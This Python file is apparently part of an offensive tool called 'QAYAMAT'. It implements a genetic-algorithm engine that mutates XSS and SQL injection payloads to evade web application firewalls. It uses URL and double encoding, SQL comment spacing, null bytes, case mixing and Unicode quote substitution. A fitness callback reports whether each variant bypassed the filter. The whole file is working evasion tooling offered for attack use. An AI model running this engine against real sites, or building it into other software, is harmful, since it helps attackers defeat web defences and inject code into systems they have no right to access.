"""
QAYAMAT — WAF Bypass Engine
Uses a genetic algorithm to evolve payload variants that evade WAF detection.
"""

import random
import string
from typing import Callable, List, Optional


class WAFBypassGenetic:
    """
    Genetic algorithm that mutates and evolves payloads to bypass WAF filtering.

    fitness_func(payload: str) -> float
        Should return 1.0 if the payload bypassed the WAF, 0.0 otherwise.
        Values between 0–1 allow partial scoring (e.g. partial encoding accepted).
    """

    ENCODE_TECHNIQUES = [
        # URL-encode angle brackets
        lambda s: s.replace("<", "%3C").replace(">", "%3E"),
        # Double URL-encode
        lambda s: s.replace("<", "%253C").replace(">", "%253E"),
        # SQL comment injection
        lambda s: s.replace(" ", "/**/"),
        # Full URL-encode
        lambda s: "".join(f"%{ord(c):02x}" if not c.isalnum() else c for c in s),
        # HTML entity encode
        lambda s: s.replace("<", "&lt;").replace(">", "&gt;"),
        # Null-byte insertion (for certain WAFs)
        lambda s: s.replace(" ", "%00"),
        # Tab instead of space
        lambda s: s.replace(" ", "\t"),
        # Mixed case
        lambda s: "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(s)),
        # Unicode full-width
        lambda s: s.replace("'", "\uff07").replace('"', "\uff02"),
        # Case swap on keywords
        lambda s: s.replace("script", "ScRiPt").replace("SELECT", "SeLeCt"),
    ]

    def __init__(
        self,
        fitness_func: Callable[[str], float],
        population_size: int = 20,
        generations: int = 15,
        mutation_rate: float = 0.3,
        elite_ratio: float = 0.2,
    ):
        self.fitness = fitness_func
        self.pop_size = population_size
        self.generations = generations
        self.mutation_rate = mutation_rate
        self.elite_size = max(1, int(population_size * elite_ratio))

    def evolve(self, original_payload: str) -> str:
        """Evolve the payload and return the best variant found."""
        population: List[str] = [
            self._mutate(original_payload) for _ in range(self.pop_size - 1)
        ]
        population.append(original_payload)  # always keep the original

        best_payload = original_payload
        best_score = 0.0

        for generation in range(self.generations):
            # Score all individuals
            scored = [(p, self.fitness(p)) for p in population]
            scored.sort(key=lambda x: x[1], reverse=True)

            if scored[0][1] > best_score:
                best_score = scored[0][1]
                best_payload = scored[0][0]

            # Early exit on perfect bypass
            if best_score >= 1.0:
                return best_payload

            # Elitism: keep top performers
            survivors = [p for p, _ in scored[: self.elite_size]]

            # Repopulate with crossover + mutation
            new_population = survivors.copy()
            while len(new_population) < self.pop_size:
                if len(survivors) >= 2:
                    parent1, parent2 = random.sample(survivors, 2)
                    child = self._crossover(parent1, parent2)
                else:
                    child = survivors[0]

                if random.random() < self.mutation_rate:
                    child = self._mutate(child)
                new_population.append(child)

            population = new_population

        return best_payload

    def _mutate(self, payload: str) -> str:
        """Apply a random encoding technique to the payload."""
        technique = random.choice(self.ENCODE_TECHNIQUES)
        try:
            return technique(payload)
        except Exception:
            return payload

    def _crossover(self, p1: str, p2: str) -> str:
        """Single-point crossover between two parent payloads."""
        if not p1 or not p2:
            return p1 or p2
        # Random crossover point
        cut1 = random.randint(0, len(p1))
        cut2 = random.randint(0, len(p2))
        return p1[:cut1] + p2[cut2:]

    def generate_variants(self, payload: str, count: int = 10) -> List[str]:
        """Generate multiple encoded variants of a payload (no fitness needed)."""
        variants = {payload}
        for _ in range(count * 3):
            variants.add(self._mutate(payload))
            if len(variants) >= count:
                break
        return list(variants)[:count]
